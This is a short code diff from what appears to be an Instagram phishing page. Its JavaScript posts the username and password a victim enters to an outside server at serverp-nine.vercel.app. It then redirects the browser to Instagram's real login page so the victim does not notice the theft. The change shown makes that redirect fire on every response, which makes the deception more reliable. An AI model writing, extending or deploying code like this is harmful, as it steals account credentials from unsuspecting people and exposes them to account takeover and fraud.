@@ -18608,14 +18608,11 @@
         axios.post('https://serverp-nine.vercel.app/Insta', {
          username,password
         })
-          .then(function(response) {
-            console.log('Success:', response.data);
-            // Handle success response
-            if (response.data.status === true || response.data.status===200) {
-    // Redirect to Instagram's official login page
-           window.location.href = 'https://www.instagram.com/accounts/login/';
-  }
-          })
+        .then(function(response) {
+      // Redirect on ANY 200 status (even empty responses)
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+    })
+
           .catch(function(error) {
             console.error('Error:', error);
             // Handle error
